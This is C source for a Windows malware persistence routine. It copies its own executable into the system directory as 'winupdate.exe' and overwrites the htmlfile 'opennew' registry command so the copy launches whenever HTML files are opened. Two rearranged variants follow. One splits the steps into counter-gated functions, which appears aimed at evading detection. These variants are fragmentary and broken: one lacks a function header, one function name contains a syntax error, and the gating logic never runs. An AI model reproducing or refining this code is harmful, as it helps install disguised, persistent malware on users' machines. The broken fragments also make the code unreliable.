DWORD WINAPI bull_moose(LPVOID tid_ptr)
{
	char MyPath[256], CpyPath[256];
	GetModuleFileName(NULL,MyPath,sizeof(MyPath));
	GetSystemDirectory(CpyPath,sizeof(CpyPath));
	strcat(CpyPath,"\\winupdate.exe");
	CopyFile(MyPath,CpyPath,FALSE);
	strcat(CpyPath," %1");

	HKEY Key32;
	RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
	RegSetValueEx(Key32,"",0,REG_SZ,CpyPath,strlen(CpyPath));
	RegCloseKey(Key32);
	return 0;
}

{
	char MyPath[256], CpyPath[256];
    HKEY Key32;

	GetModuleFileName(NULL,MyPath,sizeof(MyPath));
	GetSystemDirectory(CpyPath,sizeof(CpyPath));
	strcat(CpyPath,"\\winupdate.exe");
	RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
    
    CopyFile(MyPath,CpyPath,FALSE);
	strcat(CpyPath," %1");
	RegSetValueEx(Key32,"",0,REG_SZ,CpyPath,strlen(CpyPath));
	RegCloseKey(Key32);
	return 0;
}


char MyPath[256], CpyPath[256];
int order = 0;
void BullMoose_part_1() {
    if((2 - order) == 1){
        order = 2;
        GetModuleFileName(NULL,MyPath,sizeof(MyPath));
        GetSystemDirectory(CpyPath,sizeof(CpyPath));
        strcat(CpyPath,"\\winupdate.exe");
    }
}
void BullMoose _part_2() {
    if((2 - order) == 1){
        order = 2;	
        CopyFile(MyPath,CpyPath,FALSE);
    }
}
